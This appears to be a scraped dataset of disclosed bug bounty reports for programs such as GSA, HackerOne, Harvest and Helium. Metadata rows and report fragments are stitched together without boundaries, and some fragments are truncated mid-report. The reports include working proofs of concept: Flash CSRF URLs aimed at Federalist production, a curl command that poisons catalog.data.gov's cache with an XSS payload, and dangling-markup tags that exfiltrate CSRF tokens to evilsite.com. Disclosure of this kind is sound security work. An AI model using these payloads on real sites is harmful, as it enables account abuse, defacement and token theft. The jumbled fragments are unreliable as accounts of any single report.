http://resources.infosecinstitute.com/bypassing-csrf-protections-fun-profit/#gref
It means that JSON data without any CSRF protection is not so safe, as supposed to be.
Why it works
To clarify, the SOP/CORS are failing in the case of 307 redirect trick (due to that fact, that during 307 redirect crossdomain.xml on the target host will be called after the POST request for some reason - so POST request will reach the destination), and can only prevent the response reading by the Flash application, but not prevent the CSRF attack itself (it can be the Flash fault, or the way how the browsers are handling 307 redirects of the requests, initialized by Flash applications).
So it does not actually matter, does Access-Control-Allow-Origin header exist or not on the target host (Flash ignores it), same as crossdomain.xml.
Tested HTTP methods on Federalist API:
GET - CSRF possible
POST - CSRF possible
PUT - CSRF not possible
DELETE - CSRF not possible
POC
You can use live POC (host was redacted in this Summary due to security reasons 【ツ】):
Code 140 Bytes1http://[REDACTED]/test.swf?jsonData={""site"":1,""branch"":""master""}&php_url=http://[REDACTED]/test.php&endpoint=http://localhost:1337/v0/build/
You can specify the jsonData (for example, if you need to change siteID param), and endpoint by different Federalist endpoint (in case you are testing not on the localhost)
This POC will work on the Federalist staging site:
Code 149 Bytes1http://[REDACTED]/test.swf?jsonData={""site"":1,""branch"":""master""}&php_url=http://[REDACTED]/test.php&endpoint=https://federalist.fr.cloud.gov/v0/build
and this will work on the Federalist production site:
Code 144 Bytes1http://[REDACTED]/test.swf?jsonData={""site"":1,""branch"":""master""}&php_url=http://[REDACTED]/test.php&endpoint=https://federalist.18f.gov/v0/build
The only conditions for this:
1) Flash must be enabled in the browser.
2) User must be logged in.
3) User must have access to the site with ID 1.
In other case, change the payload from
Code 28 Bytes1{""site"":1,""branch"":""master""}
to
Code 54 Bytes1{""site"":[siteID you have access to],""branch"":""master""}
for successful testing.
The SWF file will send JSON data to the http://[REDACTED]/test.php, which then will be 307-redirected to the Federalist with correct Content-Type.
The result will be restarting the build of the site with ID 1 (if exist, and the current user is the owner).
On the screen below I did this with site ID 35 on my test instance.
[SCREENS REMOVED]
Reproduction steps:
If you want to reproduce it on your own servers, you need the host, specially crafted SWF file, PHP file with 307 redirect, and crossdomain.xml file (in case PHP and SWF files are not on same-origin). It should also work locally.
I created GitHub repo to simplify the CSRF testing process:
https://github.com/sp1d3r/swf_json_csrf
Impact
The attacker can call any POST API action on behalf of Federalist user, who will visit the specially crafted page with SWF file. The attacker can trigger the build, add the site (if the repository name is known), etc - basically, all possible POST API actions which the user can do. Still, because the attacker does not know private repo names - he can't easily do the worst actions, so this issue has Medium impact.
Suggested fix
The fix can actually be the one of (order is determined by safety):
1) Implementing anti-CSRF tokens protection (header-based). [This one was chosen as fix]
2) Switching the POST method on the API endpoints to the PUT- we can leave GET API endpoints as is, because these endpoints are only informational, and their responses can't be read by the Flash application - so I think we are safe here, and JSON Hijacking is not possible for now (if no bypass will be discovered).
3) Check the Referer/Origin header - at this moment we can't set arbitrary headers using Flash - so it can be considered as the fix too.
However, due to weird things discovered on regular basis with Flash - all can happen in the future.

GSA Bounty,11-50,0.0,1m-10m,$750.00,High,8.6,Cross-site Scripting (XSS) - Stored,Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS,"albinowax  submitted a report to GSA Bounty.Jan 10th (5 years ago)An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.
The root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.
This behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. 
Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:


Run curl command to poison cache:
curl -i -s -k  -X $'GET' \
-H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \
$'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null


Visit the poisoned page:
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6


Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)


Behind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into ""Mostrar más <svg onload=alert(document.domain)>""
This is the offending line of JavaScript:
var template_more = ['<tr class=""toggle-show toggle-show-more"">', '<td colspan=""' + cols + '"">', '<small>', '<a href=""#"" class=""show-more"">' + this.i18n('show_more') + '</a>', '<a href=""#"" class=""show-less"">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\n');
To mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. 
Please let me know if you have any questions.
Cheers,
James & Gareth

This XSS was undetectable by the most XSS scanners due to WAF in place. I noticed the reflection upon exploring the huge list of URLs (grabbed from the Google Search) manually. The WAF bypassing was an actual pain - it blocked almost all (but not all!) useful things (tags, events, etc.).
There were 3 endpoints in total, affected by this issue.

The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-end server uses the Content-Length header, which causes a desync. The following steps outline how to reproduce this vulnerability:
The purpose of the following Turbo Intruder script is to send a desync request followed by 14 requests in quick succession to increase the chances of catching the desync-ed request such that it would not poison the request of another user who happens to be browsing the page.

Note that this attack is not reliable and we may fail to 'catch on' to the victim's request which might inadvertently affect an innocent user. During testing, there was one such case of this happening and the Burp Collaborator manages to posion someone from Los Angeles, California:

In order to prevent affecting more innocent users, I stopped further testing after coming with the above proof of concept which should be sufficent to proof the existence of the vulnerability. Please let me know if any additional information is needed and I will gladly provide.
Impact
Since the javascript imports on the page can be determined by the attacker, he can host a malicious domain to steal user data, perform stored cross-site scripting and defacing the webpage for the user whos request was poisoned by the desynced request. In addition, I noticed there was a Wordpress login page but seems like it requires a specially-configured browser to access the SSO. My suspicion is that it is very likely that an attacker can steal authenticated cookies/headers which will be sent to an attacker-controlled server, although I am unable to verify (Can't get SSO to work on my browser).3 attachments:F622456: turbo1.pngF622459: turbo2.pngF622460: turbo3.png",https://hackerone.com/reports/726773,New South Wales,Australia,Sydney,2019,10,31,16,18

I hope all is well!
Description
When you leave the private program, you get a chance to get a new invitation.
But using this vulnerability, I can get new invitations without leaving private programs.
Steps:

Go to any private bug bounty program.
Click Leave Program button
Click Confirm button
Then you will see a questionnaire form. You can see this text: When you fill out this questionnaire, we will fast track you for the next invite batch.
Image F1022548: 1.png 24.29 KiBZoom in Zoom out Copy Download
Click any reason (for example: Unresponsive) and click Submit button
Return to Burp Suite and catch the request:
Image F1022553: 2.png 96.04 KiBZoom in Zoom out Copy Download
Now, send the request to Repeater and forward the request.
Go to repeater and change the team_handle parameter with another private program handle which you have.
Send the request and you will see ""was_successful"":true

So you didn't leave the 2nd program but you got a new pending invitation.
Note: Sometimes, I see ""was_successful"":true in response but to be honest, I don't know why.
Yesterday, I sent about 25-30 request with different private programs and I asked how much pending invitations do I have? to support@hackerone.com and they said It looks like you currently have 19 pending invitations at this time..
That's why I wanted to report it.

HackerOne,1001-5000,0.0,10m-50m,"$2,500.00",Medium,4.8,Improper Authentication - Generic,HackerOne Jira integration plugin Leaked JWT to unauthorized jira users,"updatelap  submitted a report to HackerOne.Feb 15th (2 years ago)Summary:
HackerOne provides an application tool HackerOne for Jira, an application that allows programs to track security issues through a jira instance. After testing the integration feature in the application, it was found that the application leads to the leakage of the JWT to unauthorized users.
About jira:
Jira Cloud allows the system administrator to add users with different Roles such as ""Basic, Trusted, and Site administrator"" with the highest authority being ""Site administrator"" and least ""Basic"". Based on these Roles allows:

The administrator can fully manage the account by accessing all projects, issues, dashboards and configuring applications.
Access to specific projects or issues. It is not possible to access to configure applications or to change any of the account settings.

Description:
As we mentioned earlier, the HackerOne for Jira application, after installing it, creates an integration between the HackerOne platform and the atlassian where cases can be synchronized from HackerOne to atlassian
And vice versa. So, after installation, administrators  jira account is allowed to go https://YOUDOMIN.atlassian.net/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira When going to this page, the following message will appear:
Image F1196098: H1PlugConf.png 37.89 KiBZoom in Zoom out Copy Download
When you click on ""click here"", you will be directed to a link  this ""https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN>"" containing JWT parameter to complete the integration process. So. Based on the About jira description, an employee with ""BSSIC"" privileges is not allowed to access the application configuration.  After testing if the HackerOne for Jira app. checks the permissions of Jira users before providing the user with the JWT, it is found that the  [HackerOne for Jira] application does not verify the user's permissions and generates the JWT code for a user with basic privileges. This allows this malicious user to link their hackerone account to an instance of a jira that they do not own. Which leads, for example, to leak names of private projects or create issues in private projects .. etc
Image F1196129: BasicVsAdmin.png 87.04 KiBZoom in Zoom out Copy Download
The normal or expected behavior that the tool should work with is to verify the role of the user who requests the configuration page, and if he does not have the privilege to display the page, a message similar to this should appear.
Image F1196135: NormBe.png 25.64 KiBZoom in Zoom out Copy Download
Steps To Reproduce

Go to Jira cloud and create jira instance.
Add user with Basic roles.
The administrator creates 8 projects and is restricted to accessing 5 projects for the administrator only.
Admin Install HackerOne for Jira app.
User Go to {BaseUrl}/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira
User steals a hackerone generated configuration link https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN> and uses it to link a Jira instance to their hackerone account
Now user can create issue in private project or linked H1 report with private issue project.

attacker can Create issue in priavet jira Project
attacker can Leaked priavet jira Project name.
When an administrator tries to link an instance of jira to the H1 account, they will not be able to because the instance has been linked to the attacking H1 account

Let me know!updatelap   posted a comment. Mar 4th (2 years ago)Hey Mr. @jobert, 
Thank you for reply and hard work on this report. I have completely retested the integration process again and found some interesting things that I would like to share with you. As I mentioned in my previous response, after your reform process, only the employees who are authorized to access the integration page are employees who have ""admin and trusted"" permissions.
At first, I created several projects from the ""administrator"" account, then went to the permission settings and restricted access to any project dashboard, or issue.. Etc, for the administrator only.
Image F1217713: siteAdmin.png 161.17 KiBZoom in Zoom out Copy Download
Now this means that any user with any permissions will not be able to view projects or issues except for the administrators group
Then I implemented the same scenario as the previous one, but this time by using an employee with ""trusted"" privileges. When the employee with ""trusted"" permissions obtained the ""https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN>"" integration link, 

He can reveal the names of all the private projects in the Jira account.
A user with ""trusted"" permissions can also post issues to projects that he or she has no access to.
Leaked comment in private issue.
Add comment in private issue.

I think the main bug is because your Jira app creates a JWT based on the app’s privileges and not based on the user’s privileges. To fundamentally solve this issue, the HackerOne Jira Jira application must first verify the permissions of the user who requests this page {BaseUrl}/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-JIRA and based on the permissions The visitor is provided with a JWT suitable for his privileges in order not to cause conflict and data leakage. Or, make access to the page {BaseUrl}/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira for the administrator only
I found that this matter is a file of concern and should be shared with you, and I think it was not taken into consideration in the previous reform.
Best,
Jafar1 attachment:F1217713: siteAdmin.pngupdatelap   posted a comment. Mar 4th (2 years ago)When entering the integration page, the HackerOne server sends the JWT value. If you refresh the page several times from the “admin” account and the “trusted” account and take the JWT value each time, you will notice that the values ​​for the “admin” and “trusted” account are created correctly, where the admin value is Linked to its ID, and the JWT for Trusted is related to its ID.

This means that the HackerOne server is correctly generating the JWT values. But it seems that the server does not verify the validity of the JWT access for each user, as the server deals with all JWTs with the same level of permissions. Which leads to misuse and leakage of data.
    
    
        
            
                
                
                
            
        
    
jobert HackerOne staff  posted a comment. Mar 9th (2 years ago)Hi @updatelap - thanks for the additional information, that's useful. When reading it though I'm wondering if this is an issue on Jira's side 🤔 Have you seen other companies suffering from the same vulnerability in their Jira app? If so, how did they remediate it? Thanks!updatelap   posted a comment. Mar 9th (2 years ago)Hey
I had this problem previously with several apps. The developers simply prevented the server from providing the user with the JWT code and made access to the integration page restricted to the administrator only. This hacker will work with the HackerOne Jira app, but I believe that this is not the main cause of your application problem.
As I mentioned previously, the server is generating the JWT token correctly, but the defect is the server's way of requesting data. This means that if we go to the ""authentication"" page, the admin or trusted user will be provided with his JWT code.
Image F1223535: connect-oauth-impersonation-flow.png 162.45 KiBZoom in Zoom out Copy Download
After that, if you click on this link and monitor the network requests, you will notice that all requests are sent to the HackerOne server and there is no request sent to ""Atlassian"". Which means that dealing with the Atlassian cloud is done by a HackerOne server. To identify the problem more clearly, I went back to the beginning of my HackerOne of the HackerOne app and noticed that when I installed an app. When I went to the Audit Log page ""https: //<YourSite>.atlassian.net/auditing/view/page/"" I noticed that when I installed the H1 Jira application, the application created and linked a new user in my account with the name ""comh"" and has System Admin privileges. Therefore, I think that the H1 server, on the server side, depends on the authorizations of the ""comh"" employee to fetch information and not on the authorizations of the trusted employee or responsible
So, can you be sure which employee relies on H1 to fetch information. If I had the wrong prediction, you can only restrict access to the integration page for the administrator only.
On the server side, you can use atlassian's REST API to make sure of the powers of each employee, and accordingly you process this information on the server and decide what information you want to return to the user while ensuring that no data is leaked.

To answer your question and make sure that the defect is not on Jira's side. After creating an instance of Jira, adding the trust user, and restricting access to projects to the administrator only, as I indicated previously, you can make sure that Jira checks the powers correctly by sending the following requests from the user's trust account.
https://jiraxsstest.atlassian.net/rest/api/3/mypermissions?permissions=ADMINISTER_PROJECTS https://jiraxsstest.atlassian.net/rest/api/3/mypermissions?permissions=ADMINISTER
Image F1224296: TrustUSerPerm.png 39.43 KiBZoom in Zoom out Copy Download
The response will be as follows, as it indicates to you that he is actually the user with trust powers, but does not have the authority to manage projects.
Then you can send the following request to make sure that the user with the powers of the trust does not have the authority to browse the project or modify or create cases:

Wish you a happy day. I tried to communicate with you on your social media, and it seems that it does not provide these options directly. I want to contact with you about this report. In the beginning, you awarded me $2,500 for the initial report. After the reform, I discussed a way to bypass the first report, and you made a second reform and paid a second reward of $500.
Therefore, after more research, it became clear to me that I was not completely right and that I was wrong in the details that I attached to it to bypass the first reform. As it became clear to me based on Atlassian documents that the employee is allowed to have Trusted access to projects that the administrator has registered because he is the employee with Trusted powers and primarily has administrative powers. Therefore, based on the above, I believe that I do not deserve the second reward, which is valued at $ 500.
So if I can be told in a way that enables me to return the $500 to H1 because in Islam, I am not allowed to take it unlawfully.
I apologize for the inconvenience

HackerOne,1001-5000,0.0,10m-50m,$1.00,No value,0.0,None,HackerOne making payments in USDC (Coinbase stable coin),"arl_rose  submitted a report to HackerOne.Jun 8th (about 1 year ago)Summary:
Hello Everyone, My name is Ariel and I’m a manager in HackerOne’s community team.
As a part of a Hack Week project, HackerOne is now supporting payments via USDC, Coinbase’s stable coin. This has been a feature requested by many hackers, that we are now glad to announce as supported. More details below.
Description:
First of all, you might be wondering “What on earth is a Hack Week”?. Don’t worry my friend, I gotcha. 
As part of the HackerOne Culture, at least once a year we host a Hack Day, or more recently, a Hack week. This is a place for HackerOnies (HackerOne employees) to do a project outside the regular duties, might have something to do with the HackerOne platform or not, might be an artistic project, a video game, or a coloring book or some exciting new feature that can be achieved in this period of time.
The idea is to hack our way into creating something new that could help some people, or make someone happy.
As part of past Hack Days, many features known today were released. Things like hacker badges, leaderboards, the Live Hacking Event dashboard, and much more have all derived from a hack day of the past. 
This time, Hack Week's theme was Summer Camp, and this is the logo. 
Image F1330772: Summercamp.png 50.38 KiBZoom in Zoom out Copy Download
So, back to our report.
As part of the Summer Camp Hack Week, I proposed to work on supporting a new type of payment to our hackers. The idea was to add to our Coinbase Crypto payments, a different type of coin rather than only supporting BTC.
This is not new, this has been requested from many of you, and also some members of our Hacker Advisory board.
So, with the amazing help of some folks from the engineering team, finance, and Solution architect team, we started working on this. 
The reason that  this report was created is to award a minimum bounty on this currency to confirm things are working as expected. 
If you are finally reading this on Hacktivity, it might mean it worked and now we are supporting payments in USDC crypto via Coinbase, so make sure you upvote this report so everyone can see it!
Thanks to everyone involved on this Hack Week project, specially to:

Steps To Reproduce
Here are the steps to configure USDC coin via Coinbase as Payout Method.

Log in on your HackerOne account
At the top right, click on the down arrow next to your profile pic, and click on “Settings”
On the menu at the left, scroll down and click on “Payout preferences”
Now, you need to click on “Add payout method”
You will now see the option of selecting the payout method in USDC coin via Coinbase

In my reply, I included a Gitlab link with the intention of pointing out that his report was a duplicate of an internal issue which had already been reported by another hacker. I noticed that the link automatically displayed a preview of the internal ticket, which of course, should only be seen by employees.

HackerOne,1001-5000,0.0,10m-50m,$500.00,Low,3.7,Violation of Secure Design Principles,Google Analytics could be used as CSP bypass for data exfiltration on hackerone.com,"aaron_costello  submitted a report to HackerOne.Jan 19th (6 years ago)Greetings, I believe I may have found a way to bypass CSP on hackerone.com
The issue lies here:
Code 45 BytesWrap lines Copy Download1img-src 'self' data: www.google-analytics.com
As you can imagine, how can image tags be used maliciously here to this safe site? Well, as you know, on google-analytics.com we have the ability to host user content.
Before we get into that, lets look at how image tags are processed.
Consider the following injected content:
Code 53 BytesWrap lines Copy Download1<img src='https://evilsite.com/steal_csrf_token?html=
A tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages in the following way,:
Code 173 BytesWrap lines Copy Download1<img src='https://evilsite.com/steal_csrf_token?html=
2<form action=""https://coinbase.com/poc"">
3
4<input type=""hidden"" name=""csrf_token"" value=""some_csrf_token_value"">
5</form>
The resulting image element will send a request to https://evilsite.com/steal_csrf_token?html=/log_csrf?html=...some_csrf_token_value....
As a result, an attacker can leverage this dangling markup attack to exfiltrate CSRF tokens to a site of their choosing.
The issue
First take a look at Google Analytics. Imagine a content injection that looks something like:
Code 33 BytesWrap lines Copy Download1< injection point >
2<p>secret</p>
The Google Analytics’ ea parameter is used to log event actions and can contain arbitrary strings. An attacker could setup a Google Analytics account and then inject an image referencing their account:
Code 175 BytesWrap lines Copy Download1<img src='https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=
2<p>secret</p>
This results in the following request, logging “secret” to their account:

Here is PoC for the last version of Internet Explorer: https://hackerone.com/bugs?subject=%2Fbigbob.lv%2F1337.php%3Fdata%3D
If You visit it, You can see Hello! This is custom text from external domain text which is from JSON here https://bigbob.lv/1337.php
You can check console and see there 3 AJAX requests sent from hackerone.com to bigbob.lv.
It is possible because there is no filtration of / slash in JavaScript when it handles subject GET param. So, it allows to send AJAX requests to external domain because of //.
This PoC will work in old versions of popular browsers which don't support CSP (http://caniuse.com/#feat=contentsecuritypolicy).
I will try to achieve XSS.

I would advise you that when testing for DoS, once you receive an error and get huge amounts of delays please stop immediately, and report right away. Do not do what I did on this report. Thank you!

On the program sandbox I have found that when creating domain instructions when adding a scope there is no input validation which was the cause of the server-side DoS. The character limit on the big input boxes is set to 10k, however with this I observed that there was not any, at first I reported this as a client-side DoS because it would render the scope management page unusable and there was no way to delete it, it was then closed as a duplicate of #584030 however digging further into this, I made a python script that allowed me to upload large amounts of payloads every request I then put it into a loop and around 350+ request I noticed an HTTP 500 Internal Server Error I then stopped to see if I had caused disruption, at first the page were loading fine so I run the python script again (note : I was running this python script on 4 terminals) and again, after a while this is when I noticed disruption on my side, and to confirm I asked the people from discord if they got disruption and they did. They received an a 502, and a 504 HTTP errors, and caused disruption on my side as well.

HackerOne,1001-5000,0.0,10m-50m,$500.00,No value,0.0,None,HTTP Parameter Pollution using semicolons in iframe element at hackerone.com/careers allows loading external Greenhouse forms,"kapytein  submitted a report to HackerOne.Dec 15th (5 years ago)Summary:
I noticed that HackerOne career pages loads it's application forms from Greenhouse.io via an iframe. The gh_jid parameter value is taken into the iframe element for the token parameter in the iframe URL (boards.greenhouse.io). Any html characters are escaped in order to avoid XSS (and possibly also to avoid any additional parameters to be included to avoid that parameters are overridden). However, I have discovered that I could load any form on the page.
Description (Include Impact):
Basically, you can load any form of Greenhouse.io via a GET request. I am not entirely sure how Greenhouse works (I also can not discover how it actually works since you only have paid subscriptions at Greenhouse), but you might also be able to craft pages instead of forms only (which would be more effective for a phishing attack, than only a form).
This happens because due to the fact that you can include a semicolon in the iframe element. As stated on https://en.wikipedia.org/wiki/Query_string, a semicolon can be used besides the ampersand in URLs embedded in HTML. 
Steps To Reproduce

Go to https://www.hackerone.com/careers?gh_jid=795069;for=airbnb for example.
You will notice an AIrbnb application form being loaded on the page.

(I sadly could not test my own forms, hence why I have used Airbnb forms to load on the page, as stated above).
A fix would be to either escape the semicolon, or to adjust the position of the for parameter in the iframe URL to avoid the URL being overridden. 
Example for changing the order of the URLs:

https://boards.greenhouse.io/embed/job_app?for=hackerone&token=795069;for=airbnb&b=https%3A%2F%2Fwww.hackerone.com%2Fcareers (this would load the form as the parameter is overridden).

with

https://boards.greenhouse.io/embed/job_app?token=795069;for=airbnb&b=https%3A%2F%2Fwww.hackerone.com%2Fcareers&for=hackerone (this would not load the form as the parameter is not overridden).

PS: After my pretty much failed report (#289999) (which was valid, but the way I described the vulnerability made it invalid), I appreciate any feedback on the quality of my report! Thanks in advance.
Impact
An attacker can load any other forms on the page, and possibly craft pages as well, but that depends on how Greenhouse.io actually works with it's forms. Therefore, a phishing attack would be possible.Summary by kapyteinUsing semicolons, I was able to override the for parameter in the iframe element. This allowed me to load external Greenhouse forms (which are not owned by HackerOne) on the page.

Harvest,51-100,0.0,1m-10m,$400.00,Medium,4.3,Business Logic Errors,"Client can redirect payment, causing payment discrepancy between Harvest and PayPal","jobert  submitted a report to Harvest.Apr 7th (6 years ago)Vulnerability details
When a client views an invoice through the web interface, it'll show a ""Pay with PayPal"" button when a standard PayPal integration has been enabled. Clicking this button will submit a POST request to PayPal. This request contains a business parameter, which is the receiver of the funds. When the client would have two PayPal addresses, it can send money to itself, while the invoice in Harvest will be marked as paid. This causes a discrepancy between Harvest and PayPal.
Proof of concept
To reproduce this vulnerability, make sure you've set up a Harvest account that has PayPal payments enabled. This can be done at https://subdomain.harvestapp.com/invoices/configure#online_payment_edit. After that, send an invoice to a client and make sure the web view is enabled. The client will receive an email with the invoice and will be able to view the invoice.

The parameter to look out for is the business parameter. As can be seen in the request above, it contains the value the Harvest account holder has put in - paypal@myconsultancy.com. When the client (the attacker) changes this to a non-existing email address and checks out with its own PayPal account, it'll send the money to itself. After the checkout, the callback to Harvest will actually set the Harvest invoice to paid.

Even though I understand that it's the consultant's responsibility to double-check funds that've received in its PayPal account, it can cause a lot of fuss if the invoice in Harvest has been marked as paid and has a valid PayPal transaction ID linked to it. From what I've seen, it isn't possible to see where the money actually went. This may cause friction between the consultant and client if the client decides to go down this path.2 attachments:F173955: Screen_Shot_2017-04-06_at_21.43.52.pngF173957: Screen_Shot_2017-04-06_at_21.53.57.pngjorgeleria Harvest staff  changed the status to Triaged. Apr 10th (6 years ago)Hi Jobert,

Harvest,51-100,0.0,1m-10m,$350.00,Low,2.0,Violation of Secure Design Principles,Content Injection at First & Last Name Parameters that could Lead Fraud Issue,"abcdefghijklmnopqrstuvwxyzabc  submitted a report to Harvest.Jul 20th (6 years ago)I. Introduction
Harvest is a Simple Online Time Tracking Software that could allow people to manage their project timeline with their team. As we can see from the short introduction, Harvest allow the team member to collaborate each other to talk about their project and (mostly) all of those users information are managed by the administrator.
Related the information that the administrator can “managed” the team member account, Harvest trying to protect all of those team member by giving the notification in every changed that conduct by the administrator to specific team member account. The notification is given from email.
But the problem exist when the user is “allowed” to change their First and Last Name with any character that people want to submit (such as “ > < / : . and other).
Generally, Content (which is Text in this case) Injection is an Attack that using the missing input validation at an trusted URL, page, or even form in the specific web application. Usually, this attack can work with the non-aware user that targeted as a victim. In short, based on OWASP, this attack is typically used as, or in conjunction with, social engineering because the attack is exploiting a code-based vulnerability and a user's trust.
.
II. Summary of the Issue
As described above, the issue could allow the Attacker to inject any “Very Convince” message at both of First and Last Name field that didn’t give the validation of the input yet.
.
III. Information
3.1. URL Name: justforPoC.harvestapp.com
.
III. Attack Narrative (Scenario) and Step to Reproduce
4.1. Make sure that there are several team member that could be managed by the Administrator (Harvest 1 - Manage People);
4.2. An administrator edit one of their team member name. As a normal flow, the member will get the notification via email (Harvest 2 - Notification);
4.3. The next step is, an administrator change their First and Last Name to create the “very convince” message to be injected at the change name notification (Harvest 3 - Username Changed at Admin). After that, administrator change the victim first / last name again and the system will automatically give the notification to the victim.
As we can see, the normal message is:

This is a confirmation that your Harvest name was changed by H1Attacker H1Last on the account JustforPoC at 9:55 pm on July 20, 2016.


Your Harvest name is now H1Victim2 H1LastVictim. If this is incorrect, please contact H1Attacker H1Last, or write to Harvest Support.

and the fake message is (Harvest 4 - Notification for User with Fake Admin Username):

This is a confirmation that your Harvest name was changed by Your Administrator. Please kindly take a look into http://evilurl.com to make sure everything goes right. After that, you can comeback to check your status again on the account JustforPoC at 10:06 pm on July 20, 2016.


Your Harvest name is now H1Victim2 H1LastVictim. If this is incorrect, please contact Your Administrator. Please kindly take a look into http://evilurl.com to make sure everything goes right. After that, you can comeback to check your status again, or write to Harvest Support.

.
V. Recommendation
Well, even it will be a classic looks and sounds, but giving the validation of the input at those affected form (First user_first_name and Last Name user_last_name) will minimize the risk. In this case, every invalid input should be rejected automatically when user trying to save the update.4 attachments:F106114: Harvest_2_-_Notification.pngF106115: Harvest_1_-_Manage_People.pngF106116: Harvest_3_-_Username_Changed_at_Admin.pngF106117: Harvest_4_-_Notification_for_User_with_Fake_Admin_Username.pngSummary by abcdefghijklmnopqrstuvwxyzabcThis is the 2nd time that Harvest shows the fair (especially, including the surprises) bug bounty. The first surprise come from report #152992 .
At the first time, I'm pretty sure if this report is not eligible for bounty and also is a low (or very low if exist) priority bug. And finally, it happened (not eligible for bounty and considered as low issue). Harvest (with Jorge) triaged the report within one day and said if the report is not eligible for the bounty even the issue is looks interesting. Because yes, it needs social engineering and the scope is limited into the internal team.
By seeing this situation, I really didn't mind with the decision. Realized if the bug is a low priority bug, it makes me really shy to make a move to ask about the progress. So I keep it silent.
Now, this day, after almost 2 years, suddenly Harvest (with Jorge again) come with the very interesting and surprise message. Jorge replied if the issue was resolved (please kindly see his very kind reply) and also will reward a small bounty. I was though if the bounty will be under the minimum bounty setup. But as you could see, Harvest acts very cool (read: fair) and unpredictable by rewarding me with $350 USD. ""The thing that basically Harvest could keep it for their pocket and didn't said anything about the report status or even the impact for the changes that made by Harvest"". But not, once again (in my own experience), they keep their integrity with their bug bounty program (in this case, by once again, told the researcher if they do something with the issue).
Please kindly note: I'm sorry for the typo that I made in this report that make this report is not comfortable to be read for public. The main reason I request the public disclosure for this report is not to share the things that I'm pretty sure that so many of researcher know this issue, but to share how very cool the Harvest's bug bounty program.
.
Summary:
As described below, the issue could allow the Attacker to inject any “Very Convince” message at:

Both of First Name (user_first_name) and Last Name (user_last_name) field at user Basic Profile;
PO Number Field (invoice_purchase_order) field at Invoices Creation Feature.

I found out that invited user to a project cannot edit the project settings unless he is a PROJECT MANAGER on it.
Now there is an option while editing project to make it BILLABLE OR NOT...
When it is NOT billable it is quite impossible to BILL an invoice for it without making it billable.
Now i found that while LINKING invoice if we change the project ID to that PROJECT ID the invoice will be linked.

Harvest,51-100,0.0,1m-10m,$150.00,High,7.95,Information Disclosure,Extracting private info of estimates.,"bugdiscloseguys  submitted a report to Harvest.Aug 18th (6 years ago)Hey there,
So when someone creates a new estimate for a client it is not accessible to anyone except the admin and the person with the private URL of the web invoice.
Now their is an option to convert estimate into invoice through  https://amandhakertest.harvestapp.com/invoices/new?estimate_id=ID_HERE through which an project manager can extract information about the private estimates of the project which he is assigned to.
If a user ( PROJECT MANAGER ) is not assigned to project X he cannot access any info of X .
If is not necessary to accept the payment for the attacker to perform this kind of attack & it will be helpful as a project manager cannot check the invoices made by the other so it is quite impossible to check into the estimates and it can also lead into accessing the private invoice created by the admin as if the admin or the client accepts the payment now he is asked to create invoice for the estimate and after creating it only he is allowed to access it but attacker can use this method and guess out what a admin would have created with the particular estimate.
Thanks.
Please let me know if you need any further assistance with.

Visiting of a page like https://%domain%.harvestapp.com/invoices/configure#foo will result into a foo cookie setting. This value isn't validated at all, which gives an attacker the opportunity to set arbitrary cookies for the entire .harvestapp.com domain.

The key for this is that the person with the XSS string must appear in one or more dropdown menus. In other words, the Person must be available to be assigned to at least one project.
I can also trigger the alert box by clicking on Expand All and any time slot where the Person with the XSS string is in the dropdown menu.
This is true for all similar dropdown menus. If I create a Client with the same string, I also get the alert box when creating a New Project since there's a dropdown menu that lists the Clients.
If I create a New Project with the XSS string in Project Name, I can trigger the alert box on the Team's tab in the same way as in the Projects' tab.
Also, by going to https://forecastapp.com/000000/projects and clicking on the malicious project, the alert box is also triggered.3 attachments:F153725: teams_tab.JPGF153726: projects_tab.JPGF153727: projects_page.JPG",https://hackerone.com/reports/199804,New York,United States,New York,2017,1,20,1,40

Helium,101-250,0.0,1m-10m,$500.00,High,8.9,Improper Access Control - Generic,Organization Takeover,"azraelsec  submitted a report to Helium.Mar 3rd (3 years ago)Hello @helium,
The console.helium.com application doesn't correctly manage the /membership/ resources and allows a user to privilege escalate an organization of which he's part of just modifying it's role.
Steps to reproduce the bug
1) Let's make two user accounts:

azraelsec@wearehackerone.com [A]
███ [B] (this is actually my personal account and can be deleted)

Initial Context: azraelsec is Administrator of the hackerone organization while federicogerardi94 is Administrator of the testhackerone organization.
Goal: azraelsec becomes Administrator of testhackerone.
2) [B] invites [A] to take part in his testhackerone organization with the role of Manager
